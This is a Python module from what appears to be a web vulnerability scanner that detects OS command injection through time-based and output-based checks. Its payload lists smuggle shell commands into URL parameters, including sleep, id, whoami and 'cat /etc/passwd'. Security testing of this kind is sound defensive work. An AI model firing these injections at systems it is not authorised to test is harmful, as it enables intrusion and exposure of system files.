"""Command Injection Scanner — OS command execution detection.

Uses time-based detection to avoid false positives.
"""

import re
import time
from typing import List
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs

from .findings import Finding
from ..core.ratelimit import get_limiter


class CMDiScanner:
    """OS Command Injection scanner."""

    NAME = "cmdi"

    # Time-based payloads (most reliable, least false positives)
    TIME_PAYLOADS = [
        ("; sleep {delay}", 3),
        ("| sleep {delay}", 3),
        ("`sleep {delay}`", 3),
        ("$(sleep {delay})", 3),
        ("&& sleep {delay}", 3),
        ("|| sleep {delay}", 3),
        ("; ping -c {delay} 127.0.0.1", 3),
        ("| ping -c {delay} 127.0.0.1", 3),
    ]

    # Output-based payloads (check for command output)
    OUTPUT_PAYLOADS = [
        ("; id", "uid="),
        ("| id", "uid="),
        ("; whoami", r'^[a-z_][a-z0-9_-]{0,32}$'),
        ("| whoami", r'^[a-z_][a-z0-9_-]{0,32}$'),
        ("; cat /etc/passwd", "root:"),
        ("| cat /etc/passwd", "root:"),
    ]

    def __init__(self, rps: float = 3.0):
        self.limiter = get_limiter(rps)

    def scan_url(self, url: str, params: dict = None) -> List[Finding]:
        """Test for command injection."""
        try:
            import httpx
        except ImportError:
            return []

        findings = []
        parsed = urlparse(url)
        test_params = params or {k: v[0] for k, v in parse_qs(parsed.query).items()}

        if not test_params:
            test_params = {"host": "127.0.0.1", "ip": "127.0.0.1", "cmd": "ls", "ping": "127.0.0.1"}

        client = httpx.Client(follow_redirects=True, timeout=15, verify=False,
                              headers={"User-Agent": "Mozilla/5.0"})

        # Get baseline timing — average over 3 requests with benign value, use monotonic
        baseline_times = []
        for _ in range(3):
            try:
                self.limiter.wait(parsed.netloc)
                bl_params = dict(test_params)
                for k in bl_params:
                    bl_params[k] = "1"
                bl_url = urlunparse(urlparse(url)._replace(query=urlencode(bl_params)))
                start = time.monotonic()
                client.get(bl_url)
                baseline_times.append(time.monotonic() - start)
            except Exception:
                continue
        if not baseline_times:
            return []
        baseline_time = sum(baseline_times) / len(baseline_times)

        for param_name in test_params:
            # Time-based detection (most reliable)
            findings.extend(self._test_time_based(client, url, param_name, test_params, baseline_time))

            if findings:
                return findings

            # Output-based detection
            findings.extend(self._test_output_based(client, url, param_name, test_params))

        return findings

    def _test_time_based(self, client, url, param, base_params, baseline_time) -> List[Finding]:
        """Time-based command injection detection."""
        findings = []
        delay = 3

        for payload_template, expected_delay in self.TIME_PAYLOADS:
            payload = payload_template.format(delay=delay)
            test_params = dict(base_params)
            test_params[param] = payload
            test_url = urlunparse(urlparse(url)._replace(query=urlencode(test_params)))

            # 3 attempts for reliability
            times = []
            for _ in range(3):
                self.limiter.wait(urlparse(url).netloc)
                try:
                    start = time.time()
                    resp = client.get(test_url)
                    elapsed = time.time() - start
                    times.append(elapsed)
                except Exception:
                    break

            if len(times) >= 2:
                avg = sum(times) / len(times)
                if avg >= delay * 0.7 and all(t >= delay * 0.5 for t in times):
                    # Verify: baseline should be fast
                    if baseline_time < delay * 0.3:
                        findings.append(Finding(
                            vuln_type="OS Command Injection",
                            title=f"Command injection via parameter '{param}' (time-based)",
                            severity="CRITICAL",
                            url=url,
                            parameter=param,
                            method="GET",
                            payload=payload,
                            evidence=f"Response delayed: {[f'{t:.1f}s' for t in times]} vs baseline {baseline_time:.1f}s",
                            description="Time-based blind command injection confirmed. Server executes injected commands.",
                            remediation="Never pass user input to system commands. Use language-native APIs instead of shell commands.",
                            cvss=10.0,
                            cwe="CWE-78",
                            tool=self.NAME,
                            verified=True,
                            confidence="HIGH",
                        ))
                        return findings

        return findings

    def _test_output_based(self, client, url, param, base_params) -> List[Finding]:
        """Output-based command injection detection."""
        findings = []

        for payload, expected_output in self.OUTPUT_PAYLOADS:
            test_params = dict(base_params)
            test_params[param] = payload
            test_url = urlunparse(urlparse(url)._replace(query=urlencode(test_params)))

            self.limiter.wait(urlparse(url).netloc)
            try:
                resp = client.get(test_url)
                body = resp.text

                if expected_output and (re.search(expected_output, body) if expected_output.startswith('^') else expected_output in body):
                    findings.append(Finding(
                        vuln_type="OS Command Injection",
                        title=f"Command injection via parameter '{param}' (output-based)",
                        severity="CRITICAL",
                        url=url,
                        parameter=param,
                        method="GET",
                        payload=payload,
                        evidence=f"Command output found: '{expected_output}' in response",
                        description="Command injection with output. Server executes and returns command results.",
                        remediation="Never pass user input to system commands.",
                        cvss=10.0,
                        cwe="CWE-78",
                        tool=self.NAME,
                        verified=True,
                        confidence="CONFIRMED",
                    ))
                    return findings

            except Exception:
                continue

        return findings
